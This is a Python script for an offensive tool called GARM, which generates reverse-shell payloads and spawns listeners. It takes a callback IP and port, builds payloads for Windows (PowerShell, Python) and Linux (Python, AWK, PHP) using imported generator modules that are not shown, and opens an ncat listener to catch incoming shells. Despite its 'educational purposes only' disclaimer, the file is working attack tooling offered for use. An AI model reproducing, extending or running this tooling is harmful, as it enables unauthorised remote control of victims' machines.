import socket
import subprocess
import os
import netifaces
import payload_types

from payload_types.windows_python_cmd import generate_python_cmd
from payload_types.windows_python_ps import generate_python_ps
from payload_types.windows_powershell import generate_powershell
from payload_types.linux_python_bash import generate_python_bash
from payload_types.linux_awk import generate_awk
from payload_types.linux_php import generate_php


# create the payload output folder if it does not exist
if not os.path.exists('output'):
    os.makedirs('output')

print('''
            ░▓▒░        ░▓█▓░
            ░▒██▒░      ░████▒░
             ░▓███▓░    ░█████▓░
              ░█████▓▒░ ░███████▒░
               ░███████▒░█████████▒░
               ░▒██████████████████▓░
              ░▒██████████████████████▓▒░
            ░▒██████████████████████████████▓▒░
           ░▓█████████████████████████████████████▓▒░
          ░████████████████████████████████████████████▓▒░
         ░▒███████████████████████████████████████████████▒░
         ░▒████████████████████████████████████████████████▓
       ░▒▓██████████████████████████████████████████████████
    ░▒▓█████████████████████████████████████████████████████
 ░▒▓████████████████████████████████████████████████████████
▓██████████████████████████████████████████████████████████▒
▒██████████████████████████████████████████████████████████░
░▒████████████████████████████████████████████████████████░
 ░▒██████████████████████████████████████████████████████░
   ░▒▓▓▓████████▓▒▒▒▓███████████████████████████████████░
                      ░▒▓█████████████████████████████▒░
                           ░▒▓███████████████████████▒░
                                ░▒▓████████████████▓░
                                  ░▓████████▓▒▒░

	 ██████   █████  ██████  ███    ███ 
	██       ██   ██ ██   ██ ████  ████ 
	██   ███ ███████ ██████  ██ ████ ██ 
	██    ██ ██   ██ ██   ██ ██  ██  ██ 
	 ██████  ██   ██ ██   ██ ██      ██ 

      -Payload Creator and Listener Spawner                             
      -Created by: 0D1NSS0N 
      -This is for Educational Purposes Only
      -I am not responsible for any malicious use of this tool                           
 ''')

def get_local_ip():
    interfaces = netifaces.interfaces()
    print('Available network interfaces:')
    available_interfaces = []
    for i, interface in enumerate(interfaces):
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            ip_address = addresses[netifaces.AF_INET][0]['addr']
            if ip_address != '127.0.0.1':  # Exclude local loopback IP
                available_interfaces.append((i, interface, ip_address))
    
    for i, (num, interface, ip_address) in enumerate(available_interfaces):
        print(f'{i+1}: {interface} ({ip_address})')
    
    print(f'{len(available_interfaces) + 1}: Enter a custom IP address')
    print(f'{len(available_interfaces) + 2}: Exit')
    
    print('')
    print('---------------------------------------------------------------------------')
    print('')
    choice = input(f'Select a network interface (1-{len(available_interfaces) + 2}): ')
    print('')
    print('---------------------------------------------------------------------------')
    print('')
    
    try:
        choice_num = int(choice)
        if choice_num == len(available_interfaces) + 2:
            exit()
        elif choice_num < 1 or choice_num > len(available_interfaces) + 1:
            raise ValueError
        elif choice_num == len(available_interfaces) + 1:
            ip_address = input('Enter a custom IP address: ')
            print(f'Using custom IP address {ip_address}')
            print('')
            print('---------------------------------------------------------------------------')
            print('')
        else:
            ip_address = available_interfaces[choice_num-1][2]
            print(f'Using IP address {ip_address} from {available_interfaces[choice_num-1][1]}')
            print('')
            print('---------------------------------------------------------------------------')
            print('')
    except ValueError:
        print('Invalid choice. Please enter a valid option.')
        return get_local_ip()
    
    return ip_address

lhost = get_local_ip()
lport = int(input('Listener Port: '))
print('')
print('---------------------------------------------------------------------------')
print('')

def choose_payload_type():
    # Prompt the user to choose an operating system type
    while True:
        print("Choose an operating system type:\n1. Windows\n2. Linux")
        os_choice = input().strip()
        if os_choice == '1':
            payload_dict = {
                '1': generate_powershell,
                '2': generate_python_ps,
                '3': generate_python_cmd
            }
            # Prompt the user to choose a payload type for Windows
            while True:
                print('')
                print('---------------------------------------------------------------------------')
                print('')
                print("Choose a payload type:\n1. PowerShell\n2. Python-PS\n3. Python-CMD")
                payload_choice = input().strip()
                if payload_choice in payload_dict:
                    return payload_dict[payload_choice](lhost, int(lport))
                else:
                    print('Invalid option. Please choose either 1, 2, or 3.')
        elif os_choice == '2':
            payload_dict = {
                '1': generate_python_bash,
                '2': generate_awk,
                '3': generate_php
            }
            # Prompt the user to choose a payload type for Linux
            while True:
                print('')
                print('---------------------------------------------------------------------------')
                print('')
                print("Choose a payload type:\n1. Python\n2. AWK\n3. PHP")
                payload_choice = input().strip()
                if payload_choice in payload_dict:
                    return payload_dict[payload_choice](lhost, int(lport))
                else:
                    print('Invalid option. Please choose either 1, 2, or 3.')
        else:
            print('Invalid option. Please choose either 1 or 2.')

choose_payload_type()

def start_listener(lhost, lport):
    # Prompt the user if they want to start a listener
    print('')
    listener = input('Do you want to start a listener on ' + lhost + ':' + str(lport) + '?(y/n): ')

    if listener == 'y':
        # Build the command to start ncat listener
        command = f"gnome-terminal --hide-menubar -- ncat -lvnp {lport}"
        
        # Run the command in a new terminal window
        subprocess.Popen(command.split())

start_listener(lhost, int(lport))
